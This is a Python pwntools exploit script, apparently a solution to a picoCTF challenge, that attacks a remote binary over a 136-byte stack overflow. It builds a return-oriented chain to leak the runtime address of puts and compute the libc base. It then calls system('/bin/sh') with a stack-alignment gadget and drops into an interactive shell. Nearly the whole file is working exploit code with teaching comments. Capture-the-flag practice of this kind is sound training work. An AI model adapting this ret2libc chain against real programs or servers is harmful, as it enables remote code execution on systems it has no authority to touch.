from pwn import *

# load the files into pwn's ELF() function
binary = ELF("vuln") # pass in executable
libc = ELF("libc.so.6") # pass in library


# use ROP() function to find gadgets
rop = ROP(binary)


# Global Offset Table (got) and Procedure Linkage Table (plt)
got_puts_addr = binary.got["puts"]
plt_puts_addr = binary.plt["puts"]

# gadgets
ret_addr = (rop.find_gadget(['ret']))[0] # we use this one later
pop_rdi_addr = rop.rdi.address

# can use .symbols to get main function address
main_addr = binary.symbols["main"]

# program will pop got_puts_addr into rdi, then call
# plt_puts_addr, since got_puts_addr is in rdi
# the program will print the location of got_puts_addr
# then we make it go back to main
payload = b"A" * 136 + p64(pop_rdi_addr) + p64(got_puts_addr) + p64(plt_puts_addr) + p64(main_addr)

# p = process("./vuln")

# connect
p = remote("mercury.picoctf.net",1774)

# receive text up until we can input stuff
p.recvuntil(b"VeR!\n")

print("sending payload: ",end="")
print(payload)

# send payload
p.sendline(payload)

# receive the AAAA's we sent
print(p.recvline())


# receive the runtime address of puts
# we need to cut out the \n also
leaked_addr = p.recvline().strip(b"\n")
# convert it into the right format
leaked_addr = int.from_bytes(leaked_addr, byteorder = "little")

libc_puts_addr = libc.symbols["puts"]

libc_base_addr = leaked_addr - libc_puts_addr


bin_sh_addr = next(libc.search(b"/bin/sh\x00")) + libc_base_addr
system_addr = libc.symbols["system"]            + libc_base_addr

# alternatively, if you want to get more fluent with pwn tools:
# libc.address = (leaked_addr) - libc_puts_addr
# print("change:")

# print(next(libc.search(b"/bin/sh\x00")) )
# print(libc.symbols["system"] )
# print( next(libc.search(b"\x00"*8)) )


print(len(p64(bin_sh_addr)))

# this also works
payload = b"A" * 136 + p64(pop_rdi_addr) + p64(got_puts_addr) + p64(plt_puts_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr)  + p64(system_addr)

# but I like this solution more
payload = b"A" * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr)  + p64(system_addr)

# this line below won't work, because we need the stack to be aligned
# some 64-bit systems need the stack to be 16-byte aligned  
# i.e. address of $rsp ends with 0 address
# payload = b"A" * 136 + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)

print(p.recvuntil(b"VeR!\n"))
print("sending payload: ",end="")
print(payload)
p.sendline(payload)
print(p.recvline())
p.interactive()
